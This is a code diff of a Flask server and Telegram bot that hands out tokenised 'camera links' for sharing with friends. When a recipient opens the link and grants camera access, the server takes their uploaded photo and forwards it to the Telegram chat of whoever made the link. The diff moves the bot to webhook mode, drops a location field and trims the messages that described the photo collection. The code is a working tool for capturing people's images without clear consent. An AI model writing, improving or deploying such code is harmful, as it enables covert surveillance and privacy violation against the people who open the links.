@@ -12,26 +12,25 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 BOT_TOKEN = os.environ['BOT_TOKEN']
 PORT = int(os.getenv('PORT', 10000))
 SITE_URL = os.getenv('SITE_URL', 'https://your-site.netlify.app')
+RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', '')
 
 app = Flask(__name__)
 CORS(app)
 
-bot = Bot(token=BOT_TOKEN)
-
-# token → user_id mapping (in-memory)
-# production me database use karo
+# in-memory token store
 active_tokens = {}
 
+# telegram application
+tg_app = None
 
-# ==================== TELEGRAM BOT HANDLERS ====================
+
+# ==================== BOT HANDLERS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data='genlink')]]
     await update.message.reply_text(
-        f"👋 Hi {u.first_name}!\n\n"
-        f"Tap to generate a camera link:\n\n"
-        f"Share this link with your friend.\n"
-        f"When they open + allow camera, you'll get their photo here.",
+        f"👋 Hi {u.first_name or 'User'}!\n\n"
+        f"Tap to generate a camera link:",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -49,22 +48,12 @@ async def genlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     link = f"{SITE_URL}?token={token}"
 
-    keyboard = [[InlineKeyboardButton("🔗 Open Link", url=link)]]
     await q.edit_message_text(
         f"🔗 Your Camera Link:\n\n"
-        f"`{link}`\n\n"
+        f"{link}\n\n"
         f"📤 Copy karke friend ko bhejo.\n"
-        f"Jab wo open karke camera Allow karega,\n"
-        f"photo yaha aayegi.",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-
-async def myphoto(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📸 Ye bot tumhare liye photos collect karta hai.\n\n"
-        "Link generate karne ke liye /start dabao."
+        f"Jab wo open karega aur Allow dabayega — photo yaha aayegi.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Open Link", url=link)]])
     )
 
 
@@ -76,7 +65,6 @@ def health():
 
 @app.route('/api/verify-token', methods=['POST'])
 def verify_token():
-    """Check if token is valid"""
     data = request.json
     token = data.get('token')
     if token in active_tokens:
@@ -86,47 +74,43 @@ def verify_token():
 
 @app.route('/api/upload', methods=['POST'])
 def upload_photo():
-    """Receive photo from browser, forward to Telegram"""
     try:
         data = request.json
         token = data.get('token')
         image_b64 = data.get('image')
-        location = data.get('location', 'unknown')
 
         if token not in active_tokens:
             return jsonify({'error': 'invalid token'}), 400
 
         target_user = active_tokens[token]['user_id']
 
-        # base64 image decode karo
         if ',' in image_b64:
             image_b64 = image_b64.split(',')[1]
 
         image_bytes = base64.b64decode(image_b64)
 
-        # temp file
         filename = f"/tmp/photo_{token}_{int(datetime.now().timestamp())}.jpg"
         with open(filename, 'wb') as f:
             f.write(image_bytes)
 
-        # bot se bhejo
+        # send photo via bot
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
 
         async def send():
-            with open(filename, 'rb') as f:
-                await bot.send_photo(
-                    chat_id=target_user,
-                    photo=f,
-                    caption=f"📸 Photo received\n\n"
-                            f"🕐 {datetime.now().strftime('%d %b %Y, %I:%M %p')}\n"
-                            f"🌐 Location: {location}"
-                )
+            bot = Bot(token=BOT_TOKEN)
+            async with bot:
+                with open(filename, 'rb') as f:
+                    await bot.send_photo(
+                        chat_id=target_user,
+                        photo=f,
+                        caption=f"📸 Photo received\n\n"
+                                f"🕐 {datetime.now().strftime('%d %b %Y, %I:%M %p')}"
+                    )
 
         loop.run_until_complete(send())
         loop.close()
 
-        # delete temp file
         try:
             os.remove(filename)
         except:
@@ -135,29 +119,69 @@ def upload_photo():
         return jsonify({'status': 'success'})
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Upload error: {e}")
         return jsonify({'error': str(e)}), 500
 
 
-# ==================== START BOT ====================
-def start_bot():
-    """Start Telegram bot in background"""
-    bot_app = Application.builder().token(BOT_TOKEN).build()
-    bot_app.add_handler(CommandHandler('start', start))
-    bot_app.add_handler(CommandHandler('myphoto', myphoto))
-    bot_app.add_handler(CallbackQueryHandler(genlink, pattern='genlink'))
+# ==================== WEBHOOK ====================
+@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
+def webhook():
+    global tg_app
+    try:
+        update_data = request.get_json(force=True)
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def process():
+            if tg_app is None:
+                return
+            update = Update.de_json(update_data, tg_app.bot)
+            await tg_app.initialize()
+            await tg_app.process_update(update)
+        
+        loop.run_until_complete(process())
+        loop.close()
+        
+    except Exception as e:
+        print(f"Webhook error: {e}")
+    
+    return "OK", 200
 
-    print("🤖 Bot starting...")
-    bot_app.run_polling(drop_pending_updates=True)
+
+# ==================== SETUP WEBHOOK ====================
+def set_telegram_webhook():
+    """Set webhook URL on Telegram"""
+    if not RENDER_URL:
+        print("RENDER_EXTERNAL_URL not set — skipping webhook setup")
+        return
+    
+    import requests
+    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
+    
+    try:
+        r = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook",
+            params={'url': webhook_url, 'drop_pending_updates': 'true'},
+            timeout=15
+        )
+        print(f"Webhook set: {r.json()}")
+    except Exception as e:
+        print(f"Webhook setup failed: {e}")
 
 
 # ==================== MAIN ====================
 if __name__ == '__main__':
-    import threading
-
-    # bot ko alag thread me chalao
-    bot_thread = threading.Thread(target=start_bot, daemon=True)
-    bot_thread.start()
-
-    # flask app chalao
+    global tg_app
+    # telegram app initialize
+    tg_app = Application.builder().token(BOT_TOKEN).build()
+    tg_app.add_handler(CommandHandler('start', start))
+    tg_app.add_handler(CallbackQueryHandler(genlink, pattern='genlink'))
+    
+    print("🤖 Bot initialized (webhook mode)")
+    
+    # set webhook
+    set_telegram_webhook()
+    
+    # start flask
     app.run(host='0.0.0.0', port=PORT)
